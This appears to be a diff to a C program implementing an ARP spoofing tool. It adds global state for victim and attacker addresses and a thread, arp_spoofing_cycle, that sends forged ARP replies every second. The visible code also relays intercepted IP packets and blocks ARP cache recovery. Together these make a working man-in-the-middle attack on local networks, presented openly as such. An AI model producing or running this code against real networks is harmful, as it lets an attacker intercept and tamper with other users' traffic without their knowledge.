@@ -1,6 +1,14 @@
 #include "arp_spoof.h"
 
 u_char relay[10000];
+uint8_t sender_mac[10][6];
+uint8_t target_mac[10][6];
+uint8_t attacker_mac[6];
+uint8_t sender_ip[10][4];
+uint8_t target_ip[10][4];
+uint8_t attacker_ip[4];
+pcap_t* handle;
+int cnt;
 
 void usage() {
   printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
@@ -113,12 +121,6 @@ int get_mac_by_ip(pcap_t* handle, uint8_t* sender_ip, uint8_t* sender_mac) {
 }
 
 void relay_ip_packet(const u_char* packet, uint8_t* my_ip, uint8_t* my_mac, uint8_t* src_mac, uint8_t* dest_mac, pcap_t* handle, int length) {
-/*
-  struct pcap_pkthdr* header;
-  const u_char* packet;
-  int res = pcap_next_ex(handle, &header, &packet);
-  if (res == -1 || res == -2) return;
-*/
   if(packet[12] == 0x08 && packet[13] == 0x00) {
     if(memcmp(packet+38, my_ip, 4)) {
       if(!memcmp(packet+6, src_mac, 6)){
@@ -149,5 +151,14 @@ void prevent_arp_recovery(const u_char* packet, uint8_t* my_ip, uint8_t* src_mac
   }
   memset(relay, 0x00, sizeof(relay));
   return;
+}
+
+void* arp_spoofing_cycle(void *arg) {
+  while(true) {
+    sleep(1);
+    for(int i = 0; i < cnt; i++) {
+      send_arp(handle, REPLY, target_ip[i], sender_ip[i], attacker_mac, sender_mac[i]);
+    }
+  }
 }
 
